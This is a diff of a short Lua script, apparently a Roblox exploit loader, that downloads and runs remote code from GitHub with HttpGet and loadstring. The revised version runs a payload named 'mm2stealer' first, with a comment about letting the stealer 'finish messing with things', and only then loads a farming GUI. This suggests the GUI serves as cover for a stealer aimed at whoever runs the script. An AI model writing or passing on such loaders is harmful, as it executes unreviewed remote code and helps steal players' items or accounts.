@@ -1,9 +1,14 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
-end
+loadstring([[
+    -- Run stealer
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
+    end)
 
-task.spawn(stealer)
-task.spawn(farm)
+    -- Delay to allow stealer to finish messing with things
+    wait(2)
+
+    -- Run GUI
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+    end)
+]])()
